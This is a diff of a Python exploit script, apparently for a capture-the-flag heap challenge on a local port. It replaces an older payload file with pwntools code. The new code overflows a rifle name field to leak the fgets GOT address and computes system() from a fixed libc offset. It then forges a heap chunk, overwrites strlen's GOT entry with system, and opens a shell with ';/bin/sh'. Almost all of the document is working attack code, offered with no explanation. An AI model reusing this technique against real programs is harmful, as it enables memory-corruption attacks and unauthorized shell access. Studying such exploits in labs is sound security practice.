@@ -1,24 +1,54 @@
+from pwn import *
 
-data = ""
+sh = remote("127.0.0.1", 4000)
 
-# address
-data += "\x00"*4 + "\x31\x00\x00\x00" + "\n"
-# phone
-data += "\x00"*244 + "\x31\x00\x00\x00" + "\n"
+def add_rifle(name, desc):
+    sh.sendline("1")
+    sh.sendline(name)
+	sh.send(desc)
 
-# malloc test data
-data += "1" + "\n"
-data += "a"*32 + "\xb8\xb1\x04\x08" + "\n"
-data += "31337" + "\n"
+def order_rifles():
+    sh.sendline("3")
 
-# free data
-data += "2" + "\n"
+def leave_message(msg):
+    sh.sendline("4")
+    sh.sendline(msg)
 
-# free data
-data += "2" + "\n"
+fgets_got = 0x804a23c
+message_ptr = 0x0804a2a8
+strlen_got = 0x0804a250
 
-# malloc fake chunk
-data += "1" + "\n"
-data += "bbbb" + "\x38\xb0\x04\x08" + "\n"
-data += str(0x61616161) + "\n"
+for x in xrange(0x63):
+    add_rifle("hello", "world")
 
+payload = ""
+payload += "A"*27
+payload += p32(fgets_got)
+add_rifle(payload, "A"*0x25)
+
+sh.sendline("2")
+sh.recvuntil("===================================")
+sh.recvuntil("===================================")
+sh.recvuntil("Name: ")
+sh.recvuntil("\nDescription: ")
+leak_data = sh.recv(4)
+fgets_addr = u32(leak_data)
+system_addr = fgets_addr-0x25a23
+
+payload = ""
+payload += "A"*27
+payload += p32(message_ptr)
+add_rifle(payload, "A"*0x25)
+
+payload = ""
+payload += p32(0x00000000)*9
+payload += p32(0x0000012c) # size
+payload += p32(0xdeadbeef)
+payload += p32(0x00000000)*10
+leave_message(payload)
+order_rifles()
+
+add_rifle("name", p32(strlen_got))
+leave_message(p32(system_addr)+";/bin/sh")
+
+sh.interactive()
